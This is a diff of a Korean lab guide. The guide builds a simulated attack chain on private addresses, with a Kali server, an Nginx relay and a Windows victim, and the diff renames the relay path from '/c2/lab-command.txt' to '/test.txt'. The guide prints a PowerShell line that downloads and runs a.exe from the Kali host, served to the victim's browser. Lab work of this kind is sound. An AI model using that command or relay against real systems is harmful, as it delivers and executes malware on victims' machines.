@@ -16,7 +16,7 @@ Kali 모의 콘텐츠 서버
         v
 Ubuntu Nginx 웹서버
 192.168.50.30
-        | /c2/lab-command.txt 경로로 중계
+        | /test.txt 경로로 중계
         v
 Windows Victim
 192.168.50.101
@@ -285,7 +285,7 @@ server {
         try_files $uri $uri/ =404;
     }
 
-    location = /c2/lab-command.txt {
+    location = /test.txt {
         proxy_pass http://192.168.50.10:8000/test.txt;
         proxy_set_header Host $host;
         default_type text/plain;
@@ -295,7 +295,7 @@ server {
 ```
 
 > [!NOTE]
-> 웹페이지의 JavaScript는 `/c2/lab-command.txt` 경로를 요청하므로 Nginx의 `location` 경로도 동일해야 합니다. `proxy_pass` URL에는 `<` 또는 `>` 기호를 입력하지 않습니다.
+> 웹페이지의 JavaScript는 `/test.txt` 경로를 요청하므로 Nginx의 `location` 경로도 동일해야 합니다. `proxy_pass` URL에는 `<` 또는 `>` 기호를 입력하지 않습니다.
 
 설정 문법을 검사합니다.
 
@@ -322,8 +322,8 @@ sudo systemctl status nginx
 Ubuntu에서 다음 중 하나를 실행합니다.
 
 ```bash
-curl http://127.0.0.1/c2/lab-command.txt
-curl http://192.168.50.30/c2/lab-command.txt
+curl http://127.0.0.1/test.txt
+curl http://192.168.50.30/test.txt
 ```
 
 다음 문자열이 출력되면 중계에 성공한 것입니다.
@@ -385,7 +385,7 @@ sudo tail -f /var/log/nginx/access.log
 
 ```text
 Victim 브라우저
--> GET /c2/lab-command.txt
+-> GET /test.txt
 -> Ubuntu Nginx
 -> Kali test.txt 요청
 -> 파워쉘 명령어 반환
@@ -412,7 +412,7 @@ ip -4 addr
 - Kali HTTP 서버가 실행 중인지 확인합니다.
 - Ubuntu에서 `curl http://192.168.50.10:8000/test.txt`가 성공하는지 확인합니다.
 - `test.txt`가 `cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash -eq '8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"`와 정확히 일치하는지 확인합니다.
-- Nginx 경로가 `/c2/lab-command.txt`인지 확인합니다.
+- Nginx 경로가 `/test.txt`인지 확인합니다.
 - `Ctrl+Shift+R`을 눌러 브라우저 캐시를 새로고침합니다.
 - 브라우저 개발자 도구의 Network 및 Console 탭에서 오류를 확인합니다.
 
